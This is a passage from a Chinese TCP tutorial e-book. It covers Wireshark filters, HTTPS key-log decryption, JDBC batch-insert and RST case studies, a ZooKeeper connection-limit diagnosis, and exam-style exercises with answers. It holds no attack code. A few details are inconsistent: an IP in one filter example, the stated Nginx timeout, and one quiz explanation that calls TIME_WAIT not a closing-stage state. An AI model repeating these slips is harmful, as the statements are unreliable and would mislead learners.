可以随便找一个 dns 的查询，找到查询报文，展开详情里面的内容，然后鼠标选中想过滤的字段，最下面的状态码就会出现当前 wireshark 对应的查看条件，比如下图中的`dns.qry.name`



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169cd8eab690a616)

常用的查询条件有：



tcp 相关过滤器

- tcp.flags.syn==1：过滤 SYN 包
- tcp.flags.reset==1：过滤 RST 包
- tcp.analysis.retransmission：过滤重传包
- tcp.analysis.zero_window：零窗口

http 相关过滤器

- http.host==t.tt：过滤指定域名的 http 包
- http.response.code==302：过滤http响应状态码为302的数据包
- http.request.method==POST：过滤所有请求方式为 POST 的 http 请求包
- http.transfer_encoding == "chunked" 根据transfer_encoding过滤
- http.request.uri contains "/appstock/app/minute/query"：过滤 http 请求 url 中包含指定路径的请求

通信延迟常用的过滤器

- `http.time>0.5`：请求发出到收到第一个响应包的时间间隔，可以用这个条件来过滤 http 的时延
- tcp.time_delta>0.3：tcp 某连接中两次包的数据间隔，可以用这个来分析 TCP 的时延
- dns.time>0.5：dns 的查询耗时

wireshakr 所有的查询条件在这里可以查到：https:/ /www.wireshark.org/docs/dfref/

## 比较运算符

wireshark 支持比较运算符和逻辑运算符。这些运算符可以灵活的组合出强大的过滤表达式。

- 等于：== 或者 eq
- 不等于：!= 或者 ne
- 大于：> 或者 gt
- 小于：< 或者 lt
- 包含 contains
- 匹配 matches
- 与操作：AND 或者 &&
- 或操作：OR 或者 ||
- 取反：NOT 或者 !

比如想过滤 ip 来自 192.168.1.1 且是 TCP 协议的数据包：

```
ip.addr == 10.0.0.10 and tcp
```

## 从 wireshark 看协议分层

下图是抓取的一次 http 请求的包`curl http://www.baidu.com`：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169cd8eac9b0de7a)



可以看到协议的分层，从上往下依次是

- Frame：物理层的数据帧
- Ethernet II：数据链路层以太网帧头部信息
- Internet Protocol Version 4：互联网层IP包头部信息
- Transmission Control Protocol：传输层的数据段头部信息，此处是TCP协议
- Hypertext Transfer Protocol：应用层 HTTP 的信息

## 跟踪 TCP 数据流（Follow TCP Stream）

在实际使用过程中，跟踪 TCP 数据流是一个很高频的使用。我们通过前面介绍的那些过滤条件找到了一些包，大多数情况下都需要查看这个 TCP 连接所有的包来查看上下文。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169cd8eac9e95d60)

这样就可以查看整个连接的所有包交互情况了，如下图所示，三次握手、数据传输、四次挥手的过程一目了然

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169cd8eacdb81ff6)



## 解密HTTPS包

随着 https 和 http2.0 的流行，https 正全面取代 http，这给我们抓包带来了一点点小困难。Wireshark 的抓包原理是直接读取并分析网卡数据。 下图是访问 [www.baidu.com](https://www.baidu.com/) 的部分包截图，传输包的内容被加密了。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169cd8ead6c9dea3)



要想让它解密 HTTPS 流量，要么拥有 HTTPS 网站的加密私钥，可以用来解密这个网站的加密流量，但这种一般没有可能拿到。要么某些浏览器支持将 TLS 会话中使用的对称加密密钥保存在外部文件中，可供 Wireshark 解密流量。 在启动 Chrome 时加上环境变量 SSLKEYLOGFILE 时，chrome 会把会话密钥输出到文件。

```
SSLKEYLOGFILE=/tmp/SSLKEYLOGFILE.log /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
```

wireshark 可以在`Wireshark -> Preferences... -> Protocols -> SSL`打开Wireshark 的 SSL 配置面板，在`(Pre)-Master-Secret log filename`选项中输入 SSLKEYLOGFILE 文件路径。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169cd8eae8cef115)



这样就可以查看加密前的 https 流量了

## 书籍推荐

上面仅列举出了部分常用的选项，关于 wireshark 可以写的东西非常多，推荐林沛满写的 wireshark 系列，我从中受益匪浅。

这篇文章我们以 JDBC 批量插入的问题来看看网络分析在实际工作用的最简单的应用。

几年前遇到过一个问题，使用 jdbc 批量插入，插入的性能总是上不去，看代码又查不出什么结果。代码简化以后如下：

```
public static void main(String[] args) throws ClassNotFoundException, SQLException {
    Class.forName("com.mysql.jdbc.Driver");

    String url = "jdbc:mysql://localhost:3306/test?useSSL=false";
    Connection connection = DriverManager.getConnection(url, "root", "");
    PreparedStatement statement = connection.prepareStatement("insert into batch_insert_test(name)values(?)");

    for (int i = 0; i < 10; i++) {
        statement.setString(1, "name#" + System.currentTimeMillis() + "#" + i);
        statement.addBatch();
    }
    statement.executeBatch();
}
```

通过 wireshark 抓包，结果如下



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169dc5d37554c47f)



可以看到 jdbc 实际上是发送了 10 次 insert 请求，既不能降低网络通信的成本，也不能在服务器上批量执行。

单步调试，发现调用到了`executeBatchSerially`

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169dc5d3748f9d16)



```
/**
 * Executes the current batch of statements by executing them one-by-one.
 * 
 * @return a list of update counts
 * @throws SQLException
 *             if an error occurs
 */
protected long[] executeBatchSerially(int batchTimeout) throws SQLException
```

看源码发现跟`connection.getRewriteBatchedStatements()`有关，当等于 true 时，会进入批量插入的流程，等于 false 时，进入逐条插入的流程。

修改 sql 连接的参数，增加`rewriteBatchedStatements=true`

```
// String url = "jdbc:mysql://localhost:3306/test?useSSL=false";
String url = "jdbc:mysql://localhost:3306/test?useSSL=false&rewriteBatchedStatements=true";
```

单步调试，可以看到这下进入到批量插入的逻辑了。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169dc5d36f57e24d)



wireshark 抓包情况如下，可以确认批量插入生效了



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169dc5d37d90af87)



rewriteBatchedStatements 参数将

```
insert into batch_insert_test(name)values('name#1554175696958#0')
insert into batch_insert_test(name)values('name#1554175696958#1')
insert into batch_insert_test(name)values('name#1554175696958#2')
insert into batch_insert_test(name)values('name#1554175696958#3')
insert into batch_insert_test(name)values('name#1554175696958#4')
insert into batch_insert_test(name)values('name#1554175696958#5')
insert into batch_insert_test(name)values('name#1554175696958#6')
insert into batch_insert_test(name)values('name#1554175696958#7')
insert into batch_insert_test(name)values('name#1554175696958#8')
insert into batch_insert_test(name)values('name#1554175696958#9')
```

改写为真正的批量插入

```
insert into batch_insert_test(name)values
('name#1554175696958#0'),('name#1554175696958#1'),
('name#1554175696958#2'),('name#1554175696958#3'),
('name#1554175696958#4'),('name#1554175696958#5'),
('name#1554175696958#6'),('name#1554175696958#7'),
('name#1554175696958#8'),('name#1554175696958#9')
```

## 小结与思考

这篇文章以一个非常简单的例子讲述了在用抓包工具来解决在 JDBC 上批量插入效率低下的问题。我们经常会用很多第三方的库，这些库我们一般没有精力把每行代码都读通读透，遇到问题时，抓一些包就可以很快确定问题的所在，这就是抓包网络分析的魅力所在。

在开发过程中，你一定遇到过这个异常：`java.net.SocketException: Connection reset`，在这个异常的产生的原因就是因为 RST 包，这篇文章会解释 RST 包产生的原因和几个典型的出现场景。

> RST（Reset）表示复位，用来强制关闭连接

## 场景一：对端主机端口不存在



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02d36d895c715)



服务器 10.211.55.5 上执行 netstat 命令可以查看当前机器监听的端口信息，`-l`表示只列出 listen 状态的 socket。

```
sudo netstat -lnp  | grep tcp
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1365/sshd             
```

可以看到目前服务器上只监听了 22 端口

这个时候客户端想连接服务端的 80 端口会发生什么呢？在客户端（10.211.55.10）开启 tcpdump 抓包，然后尝试连接服务器的 80 端口（nc 10.211.55.5 80）。

可以看到客户端发了一个 SYN 包到服务器，服务器马上回了一个 RST 包，表示拒绝



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02d36d90e3b8c)



## 场景二：Nginx 502（Bad Gateway）

Nginx 的 upstream server 没有启动或者进程挂掉是绝大多数 502 状态码的根源，先来复现一下

- 准备两台虚拟机 A（10.211.55.5） 和 B（10.211.55.10），A 装好 Nginx，B 启动一个 web 服务器监听 8080 端口（Java、Node.js、Go 什么都可以） A 机器 Nginx 配置文件如下

```
upstream web_server {
        server 10.211.55.10:8080;
        keepalive 16;
}
server {
        listen 80;
        server_name test.foo.com;
        location /test {
                proxy_http_version 1.1;
                proxy_pass http://web_server/;
        }
}
```

此时请求 [test.foo.com/test](http://test.foo.com/test) 就返回正确的 Node.js 页面



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02d36d92f6658)



下一步，kill 掉 B 机器上的 Node 进程，这时客户端请求返回了 502



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02d36d91aba26)



整个过程如下：

1. 客户端发起一个 http 请求到 nginx
2. Nginx 收到请求，根据配置文件的信息将请求转发到对应的下游 server 的 8080 端口处理，如果还没有建立连接，会发送 SYN 包准备三次握手建连，如果已经建立了连接，会发送数据包。
3. 下游服务器发现并没有进程监听 8080 端口，于是返回 RST 包 Nginx
4. Nginx 拿到 RST 包以后，认为后端已经挂掉，于是返回 502 状态码给客户端

简略图如下：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02d36d94f8794)



## 场景三：从一次 OKHttp 请求失败惨案看 RST

这个场景是使用 okhttp 发送 http 请求，发现偶发性出现请求失败的情况

```
Exception in thread "main" java.io.IOException: unexpected end of stream on Connection{test.foo.com:80, proxy=DIRECT hostAddress=test.foo.com/10.211.55.5:80 cipherSuite=none protocol=http/1.1}
	at okhttp3.internal.http1.Http1Codec.readResponseHeaders(Http1Codec.java:208)
	at okhttp3.internal.http.CallServerInterceptor.intercept(CallServerInterceptor.java:88)
	at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147)
	at okhttp3.internal.connection.ConnectInterceptor.intercept(ConnectInterceptor.java:45)
	at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147)
	at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121)
	at okhttp3.internal.cache.CacheInterceptor.intercept(CacheInterceptor.java:93)
	at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147)
	at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121)
	at okhttp3.internal.http.BridgeInterceptor.intercept(BridgeInterceptor.java:93)
	at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147)
	at okhttp3.internal.http.RetryAndFollowUpInterceptor.intercept(RetryAndFollowUpInterceptor.java:126)
	at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147)
	at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121)
	at okhttp3.RealCall.getResponseWithInterceptorChain(RealCall.java:254)
	at okhttp3.RealCall.execute(RealCall.java:92)
	at MyOkHttpKeepAliveKt.sendHttpRequest(MyOkHttpKeepAlive.kt:36)
	at MyOkHttpKeepAliveKt.main(MyOkHttpKeepAlive.kt:25)
Caused by: java.io.EOFException: \n not found: limit=0 content=…
	at okio.RealBufferedSource.readUtf8LineStrict(RealBufferedSource.java:236)
```

因为 okhttp 开启了连接池，默认启用了 HTTP/1.1 keepalive，如果拿到一个过期的连接去发起 http 请求，就一定会出现请求失败的情况。Nginx 默认的 keepalive 超时时间是 65s，为了能更快的复现，我把 Nginx 的超时时间调整为了 5s

```
http {
    ...
    keepalive_timeout  5s;
    ...
}
```

客户端请求代码简化如下

```
private val okHttpClient = OkHttpClient.Builder()
        .retryOnConnectionFailure(false)
        .connectTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

fun main(args: Array<String>) {
    // 发起第一次 http 请求
    sendHttpRequest()
    TimeUnit.SECONDS.sleep(6)
    // 发起第二次 http 请求，因为第一个连接已经释放，第二次会拿到同一条连接
    sendHttpRequest()
    System.`in`.read()
}

private fun sendHttpRequest() {
    val request = Request.Builder().url("http://test.foo.com/test").get().build()
    val response = okHttpClient.newCall(request).execute()
    println("http status: " + response.code())
    response.close()
}
```

运行以后，马上出现了上面请求失败的现象，出现的原因是什么呢？



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02d36d967081a)



Nginx的 keepalive 时间是 65s，客户端请求了第一次以后，开始闲下来，65s 倒计时到了以后 Nginx 主动发起连接要求正常分手断掉连接，客户端操作系统马上回了一个，好的，我收到了你的消息。但是连接池并不知道这个情况，没有关闭这个 socket，而是继续用这个断掉的连接发起 http 请求。就出现问题了。

tcpdump 抓包结果如下



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02d3800e2cf4e)



记客户端 10.211.55.10 为 A，服务器 10.211.55.5 为 B，逐行分析结果如下：

- 1 ~ 3：A 与 B 三次握手过程，SYN -> SYN+ACK -> ACK
- 4 ~ 5：A 向 B 发起 HTTP 请求报文，服务器 B 回了 ACK
- 6 ~ 7：B 向 A 发送 HTTP 响应报文，客户端 A 收到报文以后回了 ACK
- 8 ~ 9：经过漫长的65s，客户端 A 没有任何后续请求，Nginx 决定断掉这个连接，于是发送了一个 FIN 给客户端 A，然后进入 FIN_WAIT2 状态，A 收到 FIN 以后进入 CLOSE_WAIT 状态
- 10：客户端 A 继续发送 HTTP 请求报文到 B
- 11：因为此时 B 已经不能发送任何报文到 A，于是发送了一个 RST 包给 A，让它可以尽早断开这条连接。

这个有两个解决的方案：

第一，把 okhttp 连接池的 keepAlive 超时时间设置短于 Nginx 的超时时间 65s，比如设置成 30s `builder.connectionPool(ConnectionPool(5, 30, TimeUnit.SECONDS))` 在这种情况下，okhttp 会在连接空闲 30s 以后主动要求断掉连接，这是一种主动出击的解决方案

这种情况抓包结果如下



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02d38011fb40f)



- 1 ~ 7：完成第一次 HTTP 请求
- 8：过了 30s，客户端 A 发送 FIN 给服务器 B，要求断开连接
- 9：服务器 B，收到以后也回了 FIN + ACK
- 10：客户端 A 对服务器 B 发过来的 FIN 做确认，回复 ACK，至此四次挥手结束
- 11 ~ 13：客户端 A 使用新的端口 58604 与服务器 B 进行三次握手建连
- 13 ~ 20：剩余的过程与第一次请求相同

第二，把 `retryOnConnectionFailure` 属性设置为 true。这种做法的原理是等对方 RST 掉以后重新发起请求，这是一种被动的处理方案



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02d38011422ba)



retryOnConnectionFailure 这个属性会在请求被远端 connection reset 掉以后进行重试。可以看到 10 ~ 11 行，拿一个过期的连接发起请求，服务器 B 返回了 RST，紧接着客户端就进行了重试，完成了剩下的请求，对上层调用完全无感。

## 小结

这篇文章用三个简单例子讲解了 RST 包在真实场景中的案例。

- 第 1 个例子：对端主机端口不存在或者进程崩溃的时候建连或者发请求会收到 RST 包
- 第 2 个例子：后端 upstream 挂掉的时候，Nginx 返回 502，这个例子不过是前面第 1 个例子在另一个场景的应用
- 第 3 个例子：okhttp 参数设置不合理导致的 Connection Reset，主要原因是因为对端已经关掉连接，用一条过期的连接发送数据对端会返回 RST 包

平时工作中你有遇到到 RST 导致的连接问题吗？

之前有一个组员碰到了一个代码死活连不上 Zookeeper 的问题，我帮忙分析了一下，过程记录了在下面。

他那边包的错误堆栈是这样的：

```
java.io.IOException: Connection reset by peer
        at sun.nio.ch.FileDispatcher.read0(Native Method)
        at sun.nio.ch.SocketDispatcher.read(SocketDispatcher.java:21)
        at sun.nio.ch.IOUtil.readIntoNativeBuffer(IOUtil.java:233)
        at sun.nio.ch.IOUtil.read(IOUtil.java:200)
        at sun.nio.ch.SocketChannelImpl.read(SocketChannelImpl.java:236)
        at org.apache.zookeeper.ClientCnxnSocketNIO.doIO(ClientCnxnSocketNIO.java:68)
        at org.apache.zookeeper.ClientCnxnSocketNIO.doTransport(ClientCnxnSocketNIO.java:355)
        at org.apache.zookeeper.ClientCnxn$SendThread.run(ClientCnxn.java:1068)
```

其它组员没有遇到这个问题，他换成无线网络也可以恢复正常，从抓包文件也看到服务端发送了 RST 包给他这台机器，这就比较有意思了。

基于上面的现象，首先排除了 Zookeeper 本身服务的问题，一定是跟客户端的某些特征有关。

当时没有登录部署 ZooKeeper 机器的权限，没有去看 ZooKeeper 的日志，先从客户端这边来排查。

首先用 netstat 查看 ZooKeeper 2181 端口的连接状态，发现密密麻麻，一屏还显示不下，使用 wc -l 统计了一下，发现有 60 个，当时对 ZooKeeper 的原理并不是很了解，看到这个数字没有觉得有什么特别。

但是经过一些实验，发现小于 60 个连接的时候，客户端使用一切正常，达到 60 个的时候，就会出现 Connection Reset 异常。

直觉告诉我，可能是 ZooKeeper 对客户端连接有限制，于是去翻了一下文档，真有一个配置项`maxClientCnxns`是与客户端连接个数有关的。

> maxClientCnxns: Limits the number of concurrent connections (at the socket level) that a single client, identified by IP address, may make to a single member of the ZooKeeper ensemble. This is used to prevent certain classes of DoS attacks, including file descriptor exhaustion. Setting this to 0 or omitting it entirely removes the limit on concurrent connections.

这个参数的含义是，限制客户端与 ZooKeeper 的连接个数，通过 IP 地址来区分是不是一个客户端。如果设置为 0 表示不限制连接个数。

这个值可以通过 ZooKeeper 的配置文件`zoo.cfg` 进行修改，这个值默认是 60。

知道这一点以后重新做一下实验，将远程虚拟机中 ZooKeeper 的配置 `maxClientCnxns`改为 1

```
zoo.cfg

# the maximum number of client connections.
# increase this if you need to handle more clients
maxClientCnxns=1
```

在本地`zkCli.sh`连接 ZooKeeper

```
zkCli.sh -server c2:2181
```

发现一切正常成功



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b87cb3f6189b51)



在本地再次用`zkCli.sh`连接 ZooKeeper，发现连接成功，随后出现 `Connection Reset` 错误



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b87cb3f630a2ea)



通过抓包文件也可以看到，ZooKeeper 发出了 RST 包

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b87cb3f6260d68)



完整的包见：[zk_rst.pcapng](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_case/zk_rst.pcapng)

同时在 ZooKeeper 那一端也出现了异常提示

```
2019-06-23 05:22:25,892 [myid:] - WARN  [NIOServerCxn.Factory:0.0.0.0/0.0.0.0:2181:NIOServerCnxnFactory@188] - Too many connections from /10.211.55.2 - max is 1
```

问题基本上就定位和复现成功了，我们来看一下 ZooKeeper 的源码，看下这部分是如何处理的，这部分逻辑在`NIOServerCnxnFactory.java`的 run 方法。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b87cb3f7d7ce8b)



这部分逻辑是如果 maxClientCnxns 大于 0，且当前 IP 的连接数大于 maxClientCnxns 的话，就会主动关闭 socket，同时打印日志。

后面发现是因为同事有一个操作 ZooKeeper 的代码有 bug，导致建连非常多，后面解决以后问题就再也没有出现了。

这个案例比较简单，给我们的启示是对于黑盒的应用，通过抓包等方式可以定位出大概的方向，然后进行分析，最终找到问题的根因。

这篇文章是前面习题的解析，题目来自各个大厂的笔试题和《TCP/IP》详解，还在不停的完善中，目前以有的如下：

------

收到 IP 数据包解析以后，它怎么知道这个分组应该投递到上层的哪一个协议（UDP 或 TCP）

解析： IP 头里有一个“协议”字段，指出在上层使用的协议，比如值为 6 表示数据交给 TCP、值为 17 表示数据交给 UDP

------

TCP 提供了一种字节流服务，而收发双方都不保持记录的边界，应用程序应该如何提供他们自己的记录标识呢？

解析：应用程序使用自己约定的规则来表示消息的边界，比如有一些使用回车+换行（"\r\n"），比如 Redis 的通信协议（RESP protocol）

------

A B 两个主机之间建立了一个 TCP 连接，A 主机发给 B 主机两个 TCP 报文，大小分别是 500 和 300，第一个报文的序列号是 200，那么 B 主机接收两个报文后，返回的确认号是（）

- A、200
- B、700
- C、800
- D、1000

答案：D，500+300+200

------

客户端的使用 ISN=2000 打开一个连接，服务器端使用 ISN=3000 打开一个连接，经过 3 次握手建立连接。连接建立起来以后，假定客户端向服务器发送一段数据 Welcome the server!（长度 20 Bytes），而服务器的回答数据 Thank you!（长度 10 Bytes ），试画出三次握手和数据传输阶段报文段序列号、确认号的情况。

答案：较简单，我先偷懒不画

------

TCP/IP 协议中，MSS 和 MTU 分别工作在哪一层？

参考：MSS->传输层，MTU：链路层

------

在 MTU=1500 字节的以太网中，TCP 报文的最大载荷为多少字节？

参考：1500（MTU） - 20（IP 头大小） - 20（TCP 头大小）= 1460

------

小于（）的 TCP/UDP 端口号已保留与现有服务一一对应，此数字以上的端口号可自由分配？

- A、80
- B、1024
- C、8080
- D、65525

参考：B，保留端口号

------

下列 TCP 端口号中不属于熟知端口号的是（）

- A、21
- B、23
- C、80
- D、3210

参考：D，小于 1024 的端口号是熟知端口号

------

关于网络端口号，以下哪个说法是正确的（）

- A、通过 netstat 命令，可以查看进程监听端口的情况
- B、https 协议默认端口号是 8081
- C、ssh 默认端口号是 80
- D、一般认为，0-80 之间的端口号为周知端口号(Well Known Ports)

参考：A

------

TCP 协议三次握手建立一个连接，第二次握手的时候服务器所处的状态是（）

- A、SYN_RECV
- B、ESTABLISHED
- C、SYN-SENT
- D、LAST_ACK

参考：A，收到了 SYN，发送 SYN+ACK 以后的状态，完整转换图见文章

------

下面关于三次握手与connect()函数的关系说法错误的是（）

- A、客户端发送 SYN 给服务器
- B、服务器只发送 SYN 给客户端
- C、客户端收到服务器回应后发送 ACK 给服务器
- D、connect() 函数在三次握手的第二次返回

参考：B，服务端发送 SYN+ACK

------

HTTP传输完成，断开进行四次挥手，第二次挥手的时候客户端所处的状态是：

- A、CLOSE_WAIT
- B、LAST_ACK
- C、FIN_WAIT2
- D、TIME_WAIT

参考：C，详细的状态切换图看文章

------

正常的 TCP 三次握手和四次挥手过程（客户端建连、断连）中，以下状态分别处于服务端和客户端描述正确的是

- A、服务端：SYN-SEND，TIME-WAIT 客户端：SYN-RCVD，CLOSE-WAIT
- B、服务端：SYN-SEND，CLOSE-WAIT 客户端：SYN-RCVD，TIME-WAIT
- C、服务端：SYN-RCVD，CLOSE-WAIT 客户端：SYN-SEND，TIME-WAIT
- D、服务端：SYN-RCVD，TIME-WAIT 客户端：SYN-SEND，CLOSE-WAIT

参考：C，SYN-RCVD 出现在被动打开方服务端，排除A、B，TIME-WAIT 出现在主动断开方客户端，排除 D

------

下列TCP连接建立过程描述正确的是：

- A、服务端收到客户端的 SYN 包后等待 2*MSL 时间后就会进入 SYN_SENT 状态
- B、服务端收到客户端的 ACK 包后会进入 SYN_RCVD 状态
- C、当客户端处于 ESTABLISHED 状态时，服务端可能仍然处于 SYN_RCVD 状态
- D、服务端未收到客户端确认包，等待 2*MSL 时间后会直接关闭连接

参考：C，建连与 2*ML 没有关系，排除 A、D，服务端在收到 SYN 包且发出去 SYN+ACK 以后 进入 SYN_RCVD 状态，排除 B。如果客户端给服务端的 ACK 丢失，客户端进入 ESTABLISHED 状态时，服务端仍然处于 SYN_RCVD 状态。

------

TCP连接关闭，可能有经历哪几种状态：

- A、LISTEN
- B、TIME-WAIT
- C、LAST-ACK
- D、SYN-RECEIVED

参考：B，主动断开方进入 TIME-WAIT，其它几个都不是

------

TCP 状态变迁中，存在 TIME_WAIT 状态，请问以下正确的描述是？

- A、TIME_WAIT 状态可以帮助 TCP 的全双工连接可靠释放
- B、TIME_WAIT 状态是 TCP 是三次握手过程中的状态
- C、TIME_WAIT 状态是为了保证重新生成的 socket 不受之前延迟报文的影响
- D、TIME_WAIT 状态是为了让旧数据包消失在网络中

参考：B 明显错误，TIME_WAIT 不是挥手阶段的状态。A、C、D都正确

------

假设 MSL 是 60s，请问系统能够初始化一个新连接然后主动关闭的最大速率是多少？（忽略1~1024区间的端口）

- 参考：系统可用端口号的范围：65536 - 1024 = 64512，主动关闭方会保持 TIME_WAIT 时间 2*MSL = 120s，那最大的速率是：64512 / 120 = 537.6

不知不觉，业余时间写这本小册已经有几个月了，终于写得差不多了。写这本小册的过程还是很不容易的，收获的东西也远超我的想象。为了讲清楚细节，画了有上百张图。有时候为了找一个合理解释说服自己，英文的 RFC 看到快要吐。但是 TCP 的知识浩如烟海，虽然我已经尽力想把 TCP 写的通俗易懂、知识全面，但肯定会有很多的纰漏和考虑不周全的地方。

## 为什么一定要写这本小册

工作的时间越长，越发觉得自己能对其他人产生的影响其实是微乎其微的，如果能有一些东西，能真正帮助到他人，那便是极好的。

TCP 是我一直以来想分享的主题，因为这个在公司的各种技术分享上也讲过很多次，但是总觉得欠缺系统性，零零散散的东西对人帮助非常有限。我想写一个系列的东西应该可以帮我自己梳理清楚，看的同学也可学到更多的方法。我也想挑战一下自己，看自己能否在这一块技术上升一个层次。

## 参考资料

- [《TCP/IP详解 卷1：协议》](https://book.douban.com/subject/26825411/) 这本神书可以说是 TCP 领域的权威之作，无论是初学者还是功底深厚的网络领域高手，本书都是案头必备。推荐第 1 版和第 2 版都看一下，第 1 版自 1994 年出版以来深受读者欢迎，但其内容有些已经陈旧。第 1 版每一章后面都有非常不错的习题，很可惜新版砍掉了这部分。
- [TCP/IP高效编程 —— 改善网络程序的44个技巧](https://book.douban.com/subject/6058986/) 这也是一本经典之作，对 TCP/IP 编程中的各种问题进行了详尽的分析，利用 44 个技巧探讨 TCP 编程中的各种问题，我在这本书中受益匪浅。
- [The TCP/IP Guide —— A Comprehensive, Illustrated Internet Protocols Reference](https://book.douban.com/subject/2129076/) 这本书是一个大部头有 1618 页，暂时还没有中文版。相比于《TCP/IP 详解》，这本书更适合学习入门，有大量详实的解释和绘制精美的图表，也是强烈推荐新手学习，反正我是看得停不下来。
- [UNIX网络编程第1卷:套接口API](https://book.douban.com/subject/1500149/) 如果想真正搞懂 TCP 协议或者网络编程，这本书不可或缺，基本上所有网络编程相关的内容都在这了，里面关于阻塞非阻塞、同步异步、套接字选项、IO 多路复用的东西看的非常过瘾。你看《欢乐颂》里，应勤就是经常看这本书，才能追到杨紫。
- 林沛满的 wireshark 系列 [Wireshark网络分析就这么简单](https://book.douban.com/subject/26268767/) 这位大神写过好几本关于 wireshark 的书，本本都很经典。风格谐风趣，由浅入深地用 Wireshark 分析了常见的网络协议，基本上每篇文章都是干货，每次看都有新的收获。
- [packetdrill github 页面](https://github.com/google/packetdrill) packetdrill 的源码在这里下载，但是很可惜的是 packetdrill 文档特别少，网上也很难搜到相关的文章，主要是下面这几个
    - [packetdrill USENIX ATC paper from June 2013](http://research.google.com/pubs/pub41316.html)
    - [packetdrill USENIX](http://research.google.com/pubs/pub41848.html)
    - [Computer Networking : Principles, Protocols and Practice INJECTING TCP SEGMENTS](http://cnp3book.info.ucl.ac.be/2nd/html/exercises/packetdrill.html)

## 纸上得来终觉浅，绝知此事要躬行

要学好 TCP 不是看看文章懂点理论就好了，必须要动手搭环境、抓包分析，这样遇到问题的时候上手抓包分析心里才有底。

我在写这本小册的过程中，也是尽量把每个理论都能用实验的方式来复现，让你有机会亲手来验证各种复杂的场景。只有动手抓包分析了，这些东西才会印象深刻，才会变成真正属于你自己的知识。

首先你得有至少一台 Linux 机器，个人推荐用虚拟机安装 Linux 的方式，可以尽情的折腾。其次你得有耐得住寂寞，日新月异的新框架、新技术对我们搞技术的诱惑很大，生怕自己学慢了。但是只有掌握了底层的东西，才能真正理解新技术背后的原理和真相，才能体会到万变不离其宗的感觉。

## 最后

感谢这么有耐心看到这里的读者，希望你能给我更多的意见。这本小册还远不够完美，但是希望能及时放出来，与大家一起交流才有意思。我还有几本小册正在酝酿中，下本小册见。

欢迎关注我的公众号，虽然现在还没有什么内容。不过我会慢慢写一些偏原理一点的分布式理论、网络协议、编程语言相关的东西。